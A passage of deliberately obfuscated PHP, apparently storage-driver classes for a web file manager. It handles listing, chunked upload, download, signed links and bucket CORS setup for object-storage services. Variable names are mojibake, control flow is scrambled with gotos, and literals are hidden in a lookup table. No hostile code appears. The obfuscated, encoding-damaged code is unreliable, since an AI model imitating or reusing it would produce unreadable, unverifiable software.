$FëÌéãªÕÆ); return !$A√‡Á„ÜÛ‘[$fêŸë’≤Ú[1036]] ? !1 : $A√‡Á„ÜÛ‘[$fêŸë’≤Ú[1038]]; } public function listPath($c∆ÏëèÛè¥, $c’∆ûÀÜØ– = false) { goto F¶Ÿ¶œäóÀ; dò‘üµÌøá: return array($B‹∫“‘ÀÏ[74] => $aé„ä”‚Éπ, $B‹∫“‘ÀÏ[73] => $cº±ñòÃ“à); goto Dé¥åÊÚ„ﬂ; F¶Ÿ¶œäóÀ: $B‹∫“‘ÀÏ =& $_SERVER[—Ω]; $E„¯»Ù«‹ß = $B‹∫“‘ÀÏ[33]; $F¯Ω¢ÒÉ≥… = 1000; goto C‡ÊÇ°ñºÔ; C‡ÊÇ°ñºÔ: $aé„ä”‚Éπ = $cº±ñòÃ“à = array(); $bÒ∂ÚüÀΩ„ = rtrim($c∆ÏëèÛè¥, $B‹∫“‘ÀÏ[8]) . $B‹∫“‘ÀÏ[8]; while (!0) { $c∆Úã»∫ú– = $this->fileList($c∆ÏëèÛè¥, $E„¯»Ù«‹ß, $F¯Ω¢ÒÉ≥…); if (!$c∆Úã»∫ú–) { return !1; } $E„¯»Ù«‹ß = isset($c∆Úã»∫ú–[$B‹∫“‘ÀÏ[1254]]) ? $c∆Úã»∫ú–[$B‹∫“‘ÀÏ[1254]] : $B‹∫“‘ÀÏ[33]; $F©ù¿Õÿûû = isset($c∆Úã»∫ú–[$B‹∫“‘ÀÏ[1255]]) ? $c∆Úã»∫ú–[$B‹∫“‘ÀÏ[1255]] : array(); foreach ($F©ù¿Õÿûû as $BàÔÇ›àˆ–) { if ($BàÔÇ›àˆ–[$B‹∫“‘ÀÏ[29]] == $B‹∫“‘ÀÏ[76]) { $aé„ä”‚Éπ[] = $this->folderInfo($bÒ∂ÚüÀΩ„ . $BàÔÇ›àˆ–[$B‹∫“‘ÀÏ[28]], $c’∆ûÀÜØ–, $BàÔÇ›àˆ–); } else { $cº±ñòÃ“à[] = $this->fileInfo($bÒ∂ÚüÀΩ„ . $BàÔÇ›àˆ–[$B‹∫“‘ÀÏ[28]], $c’∆ûÀÜØ–, $BàÔÇ›àˆ–); } } if (count($F©ù¿Õÿûû) < $F¯Ω¢ÒÉ≥…) { break; } } goto dò‘üµÌøá; Dé¥åÊÚ„ﬂ: } private function recursionAllFiles($fµ©ıªÁÈÇ, &$Aäé◊Úèé¢) { $eäù˜ÆŸÇÊ =& $_SERVER[—Ω]; $aû¢É©äõÆ = $eäù˜ÆŸÇÊ[33]; $EÜıÜ∏î‰∂ = 1000; $eöã¨˜ÑÛ = $düç”ÿËÛÜ = array(); $FòˆéûŸ—¬ = rtrim($fµ©ıªÁÈÇ, $eäù˜ÆŸÇÊ[8]) . $eäù˜ÆŸÇÊ[8]; while (!0) { $D°Õ‚ÚÛﬂ∂ = $this->fileList($fµ©ıªÁÈÇ, $aû¢É©äõÆ, $EÜıÜ∏î‰∂); if (!$D°Õ‚ÚÛﬂ∂) { return !1; } $aû¢É©äõÆ = isset($D°Õ‚ÚÛﬂ∂[$eäù˜ÆŸÇÊ[1254]]) ? $D°Õ‚ÚÛﬂ∂[$eäù˜ÆŸÇÊ[1254]] : $eäù˜ÆŸÇÊ[33]; $Dñ†∏∏èãè = isset($D°Õ‚ÚÛﬂ∂[$eäù˜ÆŸÇÊ[1255]]) ? $D°Õ‚ÚÛﬂ∂[$eäù˜ÆŸÇÊ[1255]] : array(); foreach ($Dñ†∏∏èãè as $AñùÿÇœµŸ) { $FÜÖÇ±àË° = array($eäù˜ÆŸÇÊ[75] => $FòˆéûŸ—¬ . $AñùÿÇœµŸ[$eäù˜ÆŸÇÊ[28]], $eäù˜ÆŸÇÊ[76] => $AñùÿÇœµŸ[$eäù˜ÆŸÇÊ[29]] == $eäù˜ÆŸÇÊ[76] ? 1 : 0, $eäù˜ÆŸÇÊ[77] => isset($AñùÿÇœµŸ[$eäù˜ÆŸÇÊ[322]]) ? $AñùÿÇœµŸ[$eäù˜ÆŸÇÊ[322]] : 0); $Aäé◊Úèé¢[] = $FÜÖÇ±àË°; if ($FÜÖÇ±àË°[$eäù˜ÆŸÇÊ[76]] == 1) { $this->recursionAllFiles($FÜÖÇ±àË°[$eäù˜ÆŸÇÊ[75]], $Aäé◊Úèé¢); } } if (count($Dñ†∏∏èãè) < $EÜıÜ∏î‰∂) { break; } } } public function has($aê°ôµõΩı, $E⁄∞ á««É = false, $Eå¥’ﬁ›—ä = true) { goto f˘°ıãìﬂ¢; fÒŒÇ≈»µ : while (!0) { $fß®ΩºËûØ = $this->fileList($aê°ôµõΩı, $aé«™ ∞”é, $BÛØ√Ü÷Õü); if (!$fß®ΩºËûØ) { return !1; } $aé«™ ∞”é = isset($fß®ΩºËûØ[$C¨∆£ûâè´[1254]]) ? $fß®ΩºËûØ[$C¨∆£ûâè´[1254]] : $C¨∆£ûâè´[33]; $EâüÖ∞ò∏ÿ = isset($fß®ΩºËûØ[$C¨∆£ûâè´[1255]]) ? $fß®ΩºËûØ[$C¨∆£ûâè´[1255]] : array(); if (empty($EâüÖ∞ò∏ÿ)) { break; } $eíÔ«Õï®‚ = array_to_keyvalue($EâüÖ∞ò∏ÿ, $C¨∆£ûâè´[33], $C¨∆£ûâè´[29]); $C∞ÀÑ…¢≤ı = array_count_values($eíÔ«Õï®‚); $Bòì∞”ù≤— = isset($C∞ÀÑ…¢≤ı[$C¨∆£ûâè´[76]]) ? $C∞ÀÑ…¢≤ı[$C¨∆£ûâè´[76]] : 0; $F´òÆˆàﬁﬂ = count($eíÔ«Õï®‚) - $Bòì∞”ù≤—; if ($E⁄∞ á««É) { $aæú¯£‘∏Ç += $Bòì∞”ù≤—; $BÙ∆î¡ÃÊñ += $F´òÆˆàﬁﬂ; if ($D‰úËûÑê¨ < $BÛØ√Ü÷Õü) { break; } continue; } if ($Eå¥’ﬁ›—ä) { if ($F´òÆˆàﬁﬂ) { return !0; } } else { if ($Bòì∞”ù≤—) { return !0; } } if (count($EâüÖ∞ò∏ÿ) < $BÛØ√Ü÷Õü) { break; } } if ($E⁄∞ á««É) { return array($C¨∆£ûâè´[188] => $BÙ∆î¡ÃÊñ, $C¨∆£ûâè´[189] => $aæú¯£‘∏Ç); } return !1; goto b¿ﬂΩßÏÜ†; a«∑∆Ñ◊Î‚: $BÙ∆î¡ÃÊñ = 0; $aæú¯£‘∏Ç = 0; $aü…¨ó¬¥è = rtrim($aê°ôµõΩı, $C¨∆£ûâè´[8]) . $C¨∆£ûâè´[8]; goto fÒŒÇ≈»µ ; f˘°ıãìﬂ¢: $C¨∆£ûâè´ =& $_SERVER[—Ω]; $aé«™ ∞”é = $C¨∆£ûâè´[33]; $BÛØ√Ü÷Õü = 1000; goto a«∑∆Ñ◊Î‚; b¿ﬂΩßÏÜ†: } public function listAll($fßÍÒîËÉñ) { $a‚é°›°µâ = array(); $this->recursionAllFiles($fßÍÒîËÉñ, $a‚é°›°µâ); return $a‚é°›°µâ; } public function canRead($FÊëÊÃÃº) { return $this->exist($FÊëÊÃÃº) ? !0 : !1; } public function canWrite($AﬂåçîóÌ¯) { return $this->exist($AﬂåçîóÌ¯) ? !0 : !1; } public function getContent($A±Ñıºå∏) { return $this->fileSubstr($A±Ñıºå∏, 0, -1); } public function setContent($AÒÕﬂﬂÂ’Ö, $dÏ¢Ñã‚• = '') { $eÊ⁄Ú‡Û∑Õ =& $_SERVER[—Ω]; if (!$dÏ¢Ñã‚•) { $E¡Ó»›Ë®í = $this->ussRequest($AÒÕﬂﬂÂ’Ö, $eÊ⁄Ú‡Û∑Õ[209]); return $E¡Ó»›Ë®í[$eÊ⁄Ú‡Û∑Õ[1036]]; } $A§ˆÂÈ¿‡– = $this->tempFile($this->pathThis($AÒÕﬂﬂÂ’Ö)); file_put_contents($A§ˆÂÈ¿‡–, $dÏ¢Ñã‚•); if ($this->upload($AÒÕﬂﬂÂ’Ö, $A§ˆÂÈ¿‡–)) { $this->tempFileRemve($A§ˆÂÈ¿‡–); return !0; } return !1; } public function fileSubstr($d°ÊÂ⁄Ïµ, $DÃÊ±ï∞Éô, $EæùÛüå‡“) { $dÃ…¢∆’Ñã =& $_SERVER[—Ω]; if (!($EÚ‹÷€ﬁìŒ = $this->link($d°ÊÂ⁄Ïµ))) { return !1; } $DíÂ§Ëà∫¬ = !1; if ($EæùÛüå‡“ > 0) { $cÕº·é∫Ú‡ = $DÃÊ±ï∞Éô + $EæùÛüå‡“ - 1; $DíÂ§Ëà∫¬ = array($dÃ…¢∆’Ñã[1216] . $DÃÊ±ï∞Éô . $dÃ…¢∆’Ñã[408] . $cÕº·é∫Ú‡); } $c»–ßôØ”· = url_request($EÚ‹÷€ﬁìŒ, $dÃ…¢∆’Ñã[213], !1, $DíÂ§Ëà∫¬); return $c»–ßôØ”·[$dÃ…¢∆’Ñã[699]] ? $c»–ßôØ”·[$dÃ…¢∆’Ñã[1038]] : !1; } public function upload($E„¥ìï¥ﬂ∑, $Bßâäõ⁄œ•, $Bû⁄Òë⁄Ñ› = false, $e¢áÛñŸöã = REPEAT_REPLACE) { goto A±πà£ƒò¢; D‡·ñ©ß„Œ: if (!$cùøÎí£ä) { return !1; } do { $dÏ⁄õÿã–ë = $aÂ…˘Ÿ«ñÂ[$Fª⁄Â‡ïŸê[1262]]; fseek($cùøÎí£ä, $fïà¯‘Ÿÿ£); $CãÿúáèßÃ = fread($cùøÎí£ä, $dÏ⁄õÿã–ë); $cÓÆ˜ÿÇêÖ = 0; do { $cÓÆ˜ÿÇêÖ++; $aÂ…˘Ÿ«ñÂ = $this->uploadPart($E„¥ìï¥ﬂ∑, $aÂ…˘Ÿ«ñÂ, $CãÿúáèßÃ); } while (!$aÂ…˘Ÿ«ñÂ && $cÓÆ˜ÿÇêÖ < 3); if (!$aÂ…˘Ÿ«ñÂ) { return !1; } $Fï÷“ÿâ£ä = $aÂ…˘Ÿ«ñÂ[$Fª⁄Â‡ïŸê[1261]]; $fïà¯‘Ÿÿ£ += $dÏ⁄õÿã–ë; } while ($Fï÷“ÿâ£ä != -1); fclose($cùøÎí£ä); goto AÀ¶¡¶ä◊Ú; dß©†∏ÜÎ: $fïà¯‘Ÿÿ£ = 0; $Fï÷“ÿâ£ä = $aÂ…˘Ÿ«ñÂ[$Fª⁄Â‡ïŸê[1261]]; $cùøÎí£ä = fopen($Bßâäõ⁄œ•, $Fª⁄Â‡ïŸê[1166]); goto D‡·ñ©ß„Œ; AÀ¶¡¶ä◊Ú: $dΩ¢õéüñÜ = array($Fª⁄Â‡ïŸê[1263], $Fª⁄Â‡ïŸê[1264] . $aÂ…˘Ÿ«ñÂ[$Fª⁄Â‡ïŸê[1265]], $Fª⁄Â‡ïŸê[1259]); $a¢ÔÈ·É´π = $this->ussRequest($E„¥ìï¥ﬂ∑, $Fª⁄Â‡ïŸê[211], !1, $dΩ¢õéüñÜ); return $a¢ÔÈ·É´π[$Fª⁄Â‡ïŸê[1036]] ? $this->getPathOuter($Fïº»≠¥√ô) : !1; goto e”–ã´¨æ”; dÃîÒÔ⁄”ò: $dàˆø⁄õ˜Ù = $this->osChunkSize(); if ($dàˆø⁄õ˜Ù > 1024 * 1024 * 10) { $dàˆø⁄õ˜Ù = 1024 * 1024 * 10; } $dΩ¢õéüñÜ = array($Fª⁄Â‡ïŸê[1257], $Fª⁄Â‡ïŸê[1258] . $d±’Ò·õŸ⁄, $Fª⁄Â‡ïŸê[1259], $Fª⁄Â‡ïŸê[1260] . $dàˆø⁄õ˜Ù); goto FàΩÑ©Ö‚È; FàΩÑ©Ö‚È: $a¢ÔÈ·É´π = $this->ussRequest($E„¥ìï¥ﬂ∑, $Fª⁄Â‡ïŸê[211], !1, $dΩ¢õéüñÜ); if (!$a¢ÔÈ·É´π[$Fª⁄Â‡ïŸê[1036]]) { return !1; } $aÂ…˘Ÿ«ñÂ = $a¢ÔÈ·É´π[$Fª⁄Â‡ïŸê[1038]]; goto dß©†∏ÜÎ; A±πà£ƒò¢: $Fª⁄Â‡ïŸê =& $_SERVER[—Ω]; $d±’Ò·õŸ⁄ = IO::size($Bßâäõ⁄œ•); if ($d±’Ò·õŸ⁄ <= 1024 * 1024 * 200) { $F›˜ª—Ÿ…æ = array($Fª⁄Â‡ïŸê[1256] . $Bßâäõ⁄œ•); $a¢ÔÈ·É´π = $this->ussRequest($E„¥ìï¥ﬂ∑, $Fª⁄Â‡ïŸê[211], $F›˜ª—Ÿ…æ); return $a¢ÔÈ·É´π[$Fª⁄Â‡ïŸê[1036]] ? $this->getPathOuter($E„¥ìï¥ﬂ∑) : !1; } goto dÃîÒÔ⁄”ò; e”–ã´¨æ”: } private function uploadPart($bçºáı¥˘∫, $C»ıÈ˜ƒñÀ, &$CÎËÂù¡Ñœ) { $DñìËáÒ∞ç =& $_SERVER[—Ω]; $A®Œ¥ÎŸÜÃ = array($DñìËáÒ∞ç[1266], $DñìËáÒ∞ç[1264] . $C»ıÈ˜ƒñÀ[$DñìËáÒ∞ç[1265]], $DñìËáÒ∞ç[1267] . $C»ıÈ˜ƒñÀ[$DñìËáÒ∞ç[1261]], $DñìËáÒ∞ç[1268] . $C»ıÈ˜ƒñÀ[$DñìËáÒ∞ç[1262]]); $f…Óô‰ıƒÖ = $this->ussRequest($bçºáı¥˘∫, $DñìËáÒ∞ç[211], $CÎËÂù¡Ñœ, $A®Œ¥ÎŸÜÃ); return !$f…Óô‰ıƒÖ[$DñìËáÒ∞ç[1036]] ? $f…Óô‰ıƒÖ[$DñìËáÒ∞ç[1036]] : $f…Óô‰ıƒÖ[$DñìËáÒ∞ç[1038]]; } public function uploadFormData($E¿ÌÉ∏†¡Í, $D»è©»èë∆ = 3600) { return $this->uploadPolicy($E¿ÌÉ∏†¡Í, $D»è©»èë∆); } public function multiUploadFormData($f¢‚‚›ÿµÀ, $DÇÏ’¨„“Ú = 3600) { $a€ÓŸÕã˘â =& $_SERVER[—Ω]; $F§£ë«“à∆ = (int) $GLOBALS[$a€ÓŸÕã˘â[7]][$a€ÓŸÕã˘â[77]]; return $this->uploadPolicy($f¢‚‚›ÿµÀ, $DÇÏ’¨„“Ú, $F§£ë«“à∆); } private function uploadPolicy($cÓçâèú≥–, $b≠ºè™÷∫· = 3600, $D˘‰ñøó‡Ì = 0) { goto eïË˘ÖñäÃ; eïË˘ÖñäÃ: $B„≤≤â«÷ë =& $_SERVER[—Ω]; $d‘˜ôÚ™ = $B„≤≤â«÷ë[8] . $this->bucket; $a›®ù®⁄¯î = gmdate($B„≤≤â«÷ë[1201]); goto fÌÚâé Ñ¨; fÌÚâé Ñ¨: $f≠”˜„ÇØ◊ = array($B„≤≤â«÷ë[1269] => $this->bucket, $B„≤≤â«÷ë[1270] => $cÓçâèú≥–, $B„≤≤â«÷ë[1271] => time() + $b≠ºè™÷∫·, $B„≤≤â«÷ë[1272] => $a›®ù®⁄¯î); if ($D˘‰ñøó‡Ì) { $f≠”˜„ÇØ◊[$B„≤≤â«÷ë[1187]] = $D˘‰ñøó‡Ì; } $bâ£÷‹Ù⁄À = base64_encode(json_encode($f≠”˜„ÇØ◊)); goto D≥»¿™üª”; D≥»¿™üª”: $aÈô¢≥∫∫‘ = base64_encode(hash_hmac($B„≤≤â«÷ë[1238], "\120\x4f\123\124\x26{$d‘˜ôÚ™}\46{$a›®ù®⁄¯î}\46{$bâ£÷‹Ù⁄À}", md5("{$this->userpass}"), !0)); $D«¥Û®î™Ò = array($B„≤≤â«÷ë[1109] => $bâ£÷‹Ù⁄À, $B„≤≤â«÷ë[1273] => "\x55\120\x59\125\x4e\x20{$this->username}\x3a{$aÈô¢≥∫∫‘}", $B„≤≤â«÷ë[166] => $this->endpoint . $d‘˜ôÚ™); return $D«¥Û®î™Ò; goto B∞à°àêÒã; B∞à°àêÒã: } public function download($A∞‰ıà˜ß¨, $C”‘Ë∫œúô) { goto cˆÑÆœ‹åæ; cˆÑÆœ‹åæ: $aêËåÌ°Ωù = IO::getPathInner(IO::mkfile($C”‘Ë∫œúô)); if (!($D∏„ØÒú™∫ = $this->link($A∞‰ıà˜ß¨))) { return !1; } $Bñ‚∏‚≈ë = 0; goto eôø¨¶ØÎú; Cä±√è∏Õı: fclose($AÎ¥˘ìÎ⁄∆); return $C”‘Ë∫œúô; goto dãì≥«£î‚; eôø¨¶ØÎú: $Fı√ÏÉ√ÇÍ = 1024 * 200; $AÎ¥˘ìÎ⁄∆ = fopen($aêËåÌ°Ωù, $_SERVER[—Ω][1222]); while (!0) { $Dã–¯á‘Ñ“ = $this->fileSubstr($A∞‰ıà˜ß¨, $Bñ‚∏‚≈ë, $Fı√ÏÉ√ÇÍ); if ($Dã–¯á‘Ñ“ === !1) { return !1; } fwrite($AÎ¥˘ìÎ⁄∆, $Dã–¯á‘Ñ“); $Bñ‚∏‚≈ë += $Fı√ÏÉ√ÇÍ; if (strlen($Dã–¯á‘Ñ“) < $Fı√ÏÉ√ÇÍ) { break; } } goto Cä±√è∏Õı; dãì≥«£î‚: } public function link($c¯ÂÇ€§‹ä, $d”∏ØÜŒŒÍ = array()) { $c‹ıÆç¯ˆ =& $_SERVER[—Ω]; $c¯ÂÇ€§‹ä = trim($c¯ÂÇ€§‹ä, $c‹ıÆç¯ˆ[8]); if (!empty($this->token)) { $Eë™∞à˜¥â = strtotime(date($c‹ıÆç¯ˆ[1274])); $eÿ¨†É⁄éñ = substr(md5($this->token . $c‹ıÆç¯ˆ[269] . $Eë™∞à˜¥â . $c‹ıÆç¯ˆ[1275] . $c¯ÂÇ€§‹ä), 12, 8) . $Eë™∞à˜¥â; $d”∏ØÜŒŒÍ[] = $c‹ıÆç¯ˆ[1276] . $eÿ¨†É⁄éñ; } $Bû€¥ÔñÆé = !empty($d”∏ØÜŒŒÍ) ? $c‹ıÆç¯ˆ[69] . implode($c‹ıÆç¯ˆ[269], $d”∏ØÜŒŒÍ) : $c‹ıÆç¯ˆ[33]; return $c‹ıÆç¯ˆ[1112] . $this->domain . $c‹ıÆç¯ˆ[8] . $c¯ÂÇ€§‹ä . $Bû€¥ÔñÆé; } public function fileOut($D”ˆ≠‰§√µ, $BáÇ∆™Âﬂ€ = false, $aÑˆàà»íæ = false, $bπÛùÙÂìÕ = '') { if (!$aÑˆàà»íæ) { $aÑˆàà»íæ = $this->pathThis($D”ˆ≠‰§√µ); } $eƒÒ›£“êï = $BáÇ∆™Âﬂ€ ? array($_SERVER[—Ω][1277] . rawurlencode($aÑˆàà»íæ)) : array(); $Fµ≠√ º∑Ç = $this->link($D”ˆ≠‰§√µ, $eƒÒ›£“êï); $this->fileOutLink($Fµ≠√ º∑Ç); } public function fileOutServer($CΩ¨ﬂ˜∞¶™, $CÈêà‰¥Ó¡ = false, $e£“À§¡Áö = false, $dŒ“∑ÜóäÀ = '') { parent::fileOut($CΩ¨ﬂ˜∞¶™, $CÈêà‰¥Ó¡, $e£“À§¡Áö, $dŒ“∑ÜóäÀ); } public function fileOutImage($bâ˘ëÜ⁄∏Ö, $AÚëÆ∂‡÷ = 250) { $EÆöö∂≤±˘ = $this->link($bâ˘ëÜ⁄∏Ö . $_SERVER[—Ω][1278] . $AÚëÆ∂‡÷); $this->fileOutLink($EÆöö∂≤±˘); } public function fileOutImageServer($Aˆ»£æÏ√ã, $eÔ°È®ø∏ç = 250) { parent::fileOutImage($Aˆ»£æÏ√ã, $eÔ°È®ø∏ç); } public function hashMd5($Cë√ﬂ•Û‹à) { $aßÍ≤ªÑÊ =& $_SERVER[—Ω]; $EâÏÔòÉÎÙ = $this->objectMeta($Cë√ﬂ•Û‹à); return isset($EâÏÔòÉÎÙ[$aßÍ≤ªÑÊ[193]]) ? $EâÏÔòÉÎÙ[$aßÍ≤ªÑÊ[193]] : !1; } public function size($C¯êäÆ¥ÊÕ) { $eÇ∆‚µπÂ„ = $this->objectMeta($C¯êäÆ¥ÊÕ); return $eÇ∆‚µπÂ„ ? $eÇ∆‚µπÂ„[$_SERVER[—Ω][77]] : 0; } public function info($EÂÖ∆Œ§òé) { if ($this->isFolder($EÂÖ∆Œ§òé)) { return $this->folderInfo($EÂÖ∆Œ§òé); } else { if ($this->isFile($EÂÖ∆Œ§òé)) { return $this->fileInfo($EÂÖ∆Œ§òé); } } return !1; } public function exist($añ‘¡¬◊∏í) { return $this->isFile($añ‘¡¬◊∏í) || $this->isFolder($añ‘¡¬◊∏í); } public function isFile($cù’«ÑÆÖå) { return !$this->isFolder($cù’«ÑÆÖå) && $this->objectMeta($cù’«ÑÆÖå); } public function isFolder($fØˆà±âêú) { return $this->cacheMethod($_SERVER[—Ω][220], $fØˆà±âêú); } protected function objectMeta($AÊø‡˜õ⁄≈) { return $this->cacheMethod($_SERVER[—Ω][221], $AÊø‡˜õ⁄≈); } protected function _objectMeta($C©Ìâ≠òÖπ) { goto C∂åÕÂ±ä¥; C∂åÕÂ±ä¥: $d≥öªæ†ıˆ =& $_SERVER[—Ω]; if ($C©Ìâ≠òÖπ == $d≥öªæ†ıˆ[33] || $C©Ìâ≠òÖπ == $d≥öªæ†ıˆ[8]) { return array(); } $B•öÆ±éÎ√ = $this->ussRequest($C©Ìâ≠òÖπ, $d≥öªæ†ıˆ[1279]); goto DÑƒ∫ƒËœÈ; Dè–™ êËø: $EﬂÕ•éç˜á = array($d≥öªæ†ıˆ[28] => get_path_this($C©Ìâ≠òÖπ), $d≥öªæ†ıˆ[29] => isset($DŸÿ®‡ò†‚[$d≥öªæ†ıˆ[1280]]) ? $DŸÿ®‡ò†‚[$d≥öªæ†ıˆ[1280]] : null, $d≥öªæ†ıˆ[77] => isset($DŸÿ®‡ò†‚[$d≥öªæ†ıˆ[1281]]) ? $DŸÿ®‡ò†‚[$d≥öªæ†ıˆ[1281]] : null, $d≥öªæ†ıˆ[193] => isset($DŸÿ®‡ò†‚[$d≥öªæ†ıˆ[1282]]) ? $DŸÿ®‡ò†‚[$d≥öªæ†ıˆ[1282]] : null, $d≥öªæ†ıˆ[1249] => isset($DŸÿ®‡ò†‚[$d≥öªæ†ıˆ[1283]]) ? $DŸÿ®‡ò†‚[$d≥öªæ†ıˆ[1283]] : null); $EﬂÕ•éç˜á[$d≥öªæ†ıˆ[1250]] = isset($DŸÿ®‡ò†‚[$d≥öªæ†ıˆ[1284]]) ? strtotime($DŸÿ®‡ò†‚[$d≥öªæ†ıˆ[1284]]) : $EﬂÕ•éç˜á[$d≥öªæ†ıˆ[1249]]; return $EﬂÕ•éç˜á; goto eÔ‹»Ó©Ã—; DÑƒ∫ƒËœÈ: if (!$B•öÆ±éÎ√[$d≥öªæ†ıˆ[1036]]) { return null; } $DŸÿ®‡ò†‚ = isset($B•öÆ±éÎ√[$d≥öªæ†ıˆ[1038]]) ? $B•öÆ±éÎ√[$d≥öªæ†ıˆ[1038]] : array(); if (!isset($DŸÿ®‡ò†‚[$d≥öªæ†ıˆ[1280]])) { return null; } goto Dè–™ êËø; eÔ‹»Ó©Ã—: } protected function _isFolder($F¥ô›√¯öä) { $a¨«‡•∂ÑÙ =& $_SERVER[—Ω]; if ($F¥ô›√¯öä == $a¨«‡•∂ÑÙ[33] || $F¥ô›√¯öä == $a¨«‡•∂ÑÙ[8]) { return !0; } $c∞åö™•∆ü = $this->objectMeta($F¥ô›√¯öä); return isset($c∞åö™•∆ü[$a¨«‡•∂ÑÙ[29]]) && $c∞åö™•∆ü[$a¨«‡•∂ÑÙ[29]] == $a¨«‡•∂ÑÙ[76] ? !0 : !1; } } goto bö√Ö≥‚ÚÓ; EºÖàÖäùπ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($aô‡˘À°Êò) { parent::__construct($aô‡˘À°Êò); $this->signatureVersion($_SERVER[—Ω][197]); } public function fileOutLink($FÜ ˜≈ä·) { $Eºº‡±ÃƒÂ =& $_SERVER[—Ω]; if (substr($FÜ ˜≈ä·, 0, 7) == $Eºº‡±ÃƒÂ[1112]) { $FÜ ˜≈ä· = $Eºº‡±ÃƒÂ[1113] . substr($FÜ ˜≈ä·, 7); } header($Eºº‡±ÃƒÂ[153] . $FÜ ˜≈ä·); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($cÛ™à°ƒıô) { parent::__construct(); include_once SDK_DIR . $_SERVER[—Ω][1167]; $this->_init($cÛ™à°ƒıô); } public function _init($A≥£ŒÑˆÉö) { foreach ($A≥£ŒÑˆÉö as $D´¨Œ£ÎŸ§ => $FÈßÌ†¶ÃÆ) { if (isset($this->{$D´¨Œ£ÎŸ§})) { $this->{$D´¨Œ£ÎŸ§} = $FÈßÌ†¶ÃÆ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[—Ω][1168], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto eÙ¶öÏÕ˘Ê; CÏä‚ñôÚÕ: $AéÇΩœéê->addRule($cƒìî«‘ìÖ); try { $this->client->putBucketCors($this->bucket, $AéÇΩœéê); } catch (OSS\Core\OssException $fà¨∏Üì°Ë) { return !1; } return !0; goto c≤®¡Ç◊ﬂ“; c§ùÕÏä¢û: $cƒìî«‘ìÖ->addAllowedMethod($Fà∂ç£Ùåì[1172]); $cƒìî«‘ìÖ->addAllowedMethod($Fà∂ç£Ùåì[1173]); $cƒìî«‘ìÖ->addAllowedMethod($Fà∂ç£Ùåì[152]); goto a±ŒÒÇºÒ¶; a±ŒÒÇºÒ¶: $cƒìî«‘ìÖ->setMaxAgeSeconds(600); $cƒìî«‘ìÖ->addExposeHeader($Fà∂ç£Ùåì[1174]); $cƒìî«‘ìÖ->addAllowedHeader($Fà∂ç£Ùåì[1169]); goto CÏä‚ñôÚÕ; eÙ¶öÏÕ˘Ê: $Fà∂ç£Ùåì =& $_SERVER[—Ω]; $AéÇΩœéê = new OSS\Model\CorsConfig(); $cƒìî«‘ìÖ = new OSS\Model\CorsRule(); goto E‘óØ¥›°Ö; E‘óØ¥›°Ö: $cƒìî«‘ìÖ->addAllowedOrigin($Fà∂ç£Ùåì[1169]); $cƒìî«‘ìÖ->addAllowedMethod($Fà∂ç£Ùåì[1170]); $cƒìî«‘ìÖ->addAllowedMethod($Fà∂ç£Ùåì[1171]); goto c§ùÕÏä¢û; c≤®¡Ç◊ﬂ“: } public function getBucketCors() { goto EèãÖ«ÃÑ; A≤úë°é∂ø: if (!$c¡÷¥‚ﬁ”â || !($CËçË£Õº“ = $c¡÷¥‚ﬁ”â->getRules())) { return null; } $a‘ÀﬂçÉÙŒ = $CËçË£Õº“[0]->getAllowedOrigins(); $e…Ω¿¿≠åñ = $CËçË£Õº“[0]->getAllowedMethods(); goto b¬ôèû°‘Ω; b¬ôèû°‘Ω: $DÀÙÖ´´ÖÏ = $CËçË£Õº“[0]->getMaxAgeSeconds(); $DÙ∞∞ƒ∑éÔ = $CËçË£Õº“[0]->getExposeHeaders(); $EàÔƒ’Œ∫Ü = $CËçË£Õº“[0]->getAllowedHeaders(); goto AΩ¿ß“©ôÌ; EèãÖ«ÃÑ: $Aÿ©—Ü°é— =& $_SERVER[—Ω]; $c¡÷¥‚ﬁ”â = null; try { $c¡÷¥‚ﬁ”â = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $eàœõ”áÕ¨) { return null; } goto A≤úë°é∂ø; AΩ¿ß“©ôÌ: return array($Aÿ©—Ü°é—[172] => isset($a‘ÀﬂçÉÙŒ[0]) ? $a‘ÀﬂçÉÙŒ[0] : $Aÿ©—Ü°é—[33], $Aÿ©—Ü°é—[176] => $e…Ω¿¿≠åñ, $Aÿ©—Ü°é—[1175] => $DÀÙÖ´´ÖÏ, $Aÿ©—Ü°é—[1176] => isset($DÙ∞∞ƒ∑éÔ[0]) ? $DÙ∞∞ƒ∑éÔ[0] : $Aÿ©—Ü°é—[33], $Aÿ©—Ü°é—[174] => isset($EàÔƒ’Œ∫Ü[0]) ? $EàÔƒ’Œ∫Ü[0] : $Aÿ©—Ü°é—[33]); goto FñüŒ÷Óìè; FñüŒ÷Óìè: } public function isBucketCors() { goto B≠‘ùÏêÃ¯; B≠‘ùÏêÃ¯: $AªË«ˆı†î =& $_SERVER[—Ω]; $E™æøëÿ‚ = $this->getBucketCors(); if (!$E™æøëÿ‚ || !is_array($E™æøëÿ‚)) { return !1; } goto B®◊ë®√Çô; B®◊ë®√Çô: if ($E™æøëÿ‚[$AªË«ˆı†î[172]] != $AªË«ˆı†î[173] || $E™æøëÿ‚[$AªË«ˆı†î[174]] != $AªË«ˆı†î[173]) { return !1; } $CΩƒÔ∂®Üì = array_map($AªË«ˆı†î[175], $E™æøëÿ‚[$AªË«ˆı†î[176]]); if (!is_array($CΩƒÔ∂®Üì)) { $CΩƒÔ∂®Üì = array(); } goto AÔ¢üºﬁûÜ; AÔ¢üºﬁûÜ: $A≈ò‡∏É‰ƒ = array($AªË«ˆı†î[177], $AªË«ˆı†î[178], $AªË«ˆı†î[179], $AªË«ˆı†î[180], $AªË«ˆı†î[181]); $e∞ËóÓ∂Éù = array_diff($A≈ò‡∏É‰ƒ, $CΩƒÔ∂®Üì); return empty($e∞ËóÓ∂Éù); goto Cæ—ØæÛÉÏ; Cæ—ØæÛÉÏ: } public function mkfile($Dô˜Ö¨ªëÁ, $FÓ≠Êˆ÷Í´ = '', $C©  ≠¬òˆ = REPEAT_RENAME) { $EÀ“’ﬁÊËﬂ = $this->setContent($Dô˜Ö¨ªëÁ, $FÓ≠Êˆ÷Í´); if ($EÀ“’ﬁÊËﬂ !== !1) { return 